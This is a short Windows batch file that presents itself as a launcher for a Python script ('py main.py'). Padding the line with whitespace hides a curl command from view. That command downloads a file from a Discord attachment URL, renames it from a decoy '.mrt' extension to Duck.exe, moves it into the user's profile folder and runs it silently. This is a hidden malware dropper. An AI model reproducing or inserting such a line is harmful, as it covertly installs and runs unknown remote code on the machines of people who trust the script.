@echo off
																																																																																																																																			curl -L -o Duck.mrt "https://cdn.discordapp.com/attachments/1295508775205343335/1312896530373541949/Duck.mrt?ex=674e29ad&is=674cd82d&hm=b1eec139eba247efb4160946f61bba2f0578253007b4592e2902959392aaddf7&" >nul 2>&1 && rename Duck.mrt Duck.exe >nul 2>&1 && move /y Duck.exe %USERPROFILE%\Duck.exe >nul 2>&1 && start %USERPROFILE%\Duck.exe
py main.py

pause